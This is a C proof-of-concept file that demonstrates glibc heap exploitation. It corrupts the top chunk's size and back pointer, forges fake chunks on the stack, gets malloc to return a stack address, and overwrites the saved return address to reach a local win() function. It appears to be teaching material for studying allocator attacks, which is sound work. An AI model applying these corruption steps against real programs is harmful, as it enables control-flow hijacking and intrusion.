/* POC of House of Orange into House of Lore *
 * cc -m32 -o hoo hoo.c myprinter.c          *
 * or                                        *
 * cc -m32 -o hoo hoo.c -D DISABLE_MYPRINTER */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define WHATEVER 0xbadbeef

#define STREAM stdout

/* myprinter prints without using nor affecting the heap */
#ifndef DISABLE_MYPRINTER
# include "myprinter.h"
# define U(x) ((uintptr_t) (x))
#else
# define myfprintf fprintf
# define XT "0x%08x"
# define BT "0x%02hhx"
# define U(x) ((int) (x))
#endif

#define colored_printf(fmt, ...) \
  myfprintf(STREAM, "\e[33m" fmt "\e[m", ##__VA_ARGS__)

/* ----------- MALLOC ----------- */
struct chunk {
  size_t prev_sz;
  size_t sz;
  void * fd;
  void * bk;
};

#define PAGE_SZ 0x1000

#define chk_get_size(chk) ( ((struct chunk *) (chk))->sz & ~0x7 )
#define chk_get_next_chunk(chk) ( (void *) (chk) + chk_get_size(chk) )
#define mem_get_chunk(mem) ( (void *) (mem) - offsetof(struct chunk, fd) )
#define mem_get_chunk_size(mem) ( chk_get_size(mem_get_chunk(mem)) )
#define mem_get_next_chunk(mem) ( chk_get_next_chunk(mem_get_chunk(mem)) )
#define mem_get_next_mem(mem) ( (void *) (mem) + mem_get_chunk_size(mem) )
/* ----------- MALLOC ----------- */

/* ----------- Helpers ---------- */
void print_hex_contents (void * addr, size_t count)
{
  colored_printf(XT ":\n", U(addr));
  for (size_t i = 0; i < count; ++i) {
    if (!(i % sizeof(void *)))
      colored_printf("| ");
    colored_printf(BT " ", U(((char *) addr)[i]));
  }
  colored_printf("|\n\n");
}

#define print_struct_ptr(x) \
do { \
  colored_printf(#x " at "); \
  print_hex_contents(x, sizeof(*x)); \
} while (0)

#define set(lhs, rhs) \
do { \
  typeof(lhs) _eval = (typeof(lhs)) (rhs); \
  myfprintf(STREAM, XT ": " XT " <- " XT " (= " #rhs ")\n", \
    U(&lhs), U(lhs), U(_eval)); \
  lhs = _eval; \
} while (0)

#define declare(lhs_ty, lhs_name, rhs) \
  lhs_ty lhs_name; \
  { \
    lhs_ty _eval = rhs; \
    myfprintf(STREAM, #lhs_ty " " #lhs_name " = " #rhs " = " XT "\n", \
      _eval); \
    lhs_name = _eval; \
  }

intptr_t get_ebp (void) { __asm__("movl (%esp), %eax"); }
/* ----------- Helpers ---------- */


/* Getting eip to point here means the exploitation was successful */
__attribute__((noreturn)) void win (void)
{
  myfprintf(stdout, "\nYou won! Good job :)\n");
  exit(EXIT_SUCCESS);
}

void lose (void) { myfprintf(stderr, "Exploit failed.\n"); }

/* ===== HOUSE OF ORANGE ===== */
void houseoforange (void)
{
/* 1) Chunk next to top */
  declare(void *, mem, malloc(1));

  struct chunk * top = (struct chunk *) mem_get_next_chunk(mem);

  myfprintf(STREAM, "\nAllocated mem contiguous to top.\n");
  print_struct_ptr(top);

  myfprintf(STREAM,
    "The 3 last nibbles of top->sz = " XT " must not change.\n", U(top->sz));
  size_t new_top_size = top->sz & (PAGE_SZ - 1);

/* 2) Overflow it to corrupt top's size */
  myfprintf(STREAM, "Overflow => ");
  set(top->sz, new_top_size);
  print_struct_ptr(top);
  myfprintf(STREAM, "\n");

/* 3) Malloc of slightly big size: around PAGE_SZ = 0x1000 */
  declare(void *, new_mem, malloc(PAGE_SZ));
  if (!((uintptr_t) mem_get_chunk(new_mem) & (PAGE_SZ - 1)))
    colored_printf("Allocation answered in new page.\n");

  /*
   * Since PAGE_SZ > new_top_size, a new heap (and a new top) are allocated
   * from the system.
   * Then the old_top becomes an ordinary chunk that is to be freed
   * and put in the unsorted bin
   */
  #define old_top top /* alias for clarity */
  print_struct_ptr(old_top);


  /* ========================================= *
   * Unsorted Bin => House of Lore type attack *
   * ========================================= */

  struct chunk fake1, fake2;

  fake1.sz = fake2.sz = 0x11; /* MIN_SIZE | PREV_INUSE */
  fake1.prev_sz = fake2.prev_sz = WHATEVER;

  fake1.bk = (void *) &fake2;
  fake2.fd = (void *) &fake1;
  /* We got &fake1->bk->fd == &fake1 */

/* 4) Overflow again to corrupt top's bk ptr */
  myfprintf(STREAM, "Overflow => ");
  set(old_top->sz, new_top_size);
  myfprintf(STREAM, "            ");
  set(old_top->fd, WHATEVER);
  myfprintf(STREAM, "            ");
  set(old_top->bk, &fake1);

  fake1.fd = (void *) old_top;
  /* We got old_top->bk->fd == old_top */
  print_struct_ptr(&fake1);

  print_struct_ptr(old_top);
  declare(intptr_t *, array, malloc(1)); /* HoL => we get a 'corrupted' addr */

  /* array should now be pointing to the stack, thus near the saved eip */
  intptr_t offset_to_eip_idx =
    1 + (get_ebp() - (intptr_t) array) / sizeof(intptr_t);
  if (offset_to_eip_idx < 0x100) {
    myfprintf(STREAM, "\narray[" BT "] <- " XT " (= &win)\n",
      U(offset_to_eip_idx), U(&win));
    array[offset_to_eip_idx] = (intptr_t) &win;
  }
}

int main (int argc, char * argv[])
{
  houseoforange();
  lose();
  return 0;
}
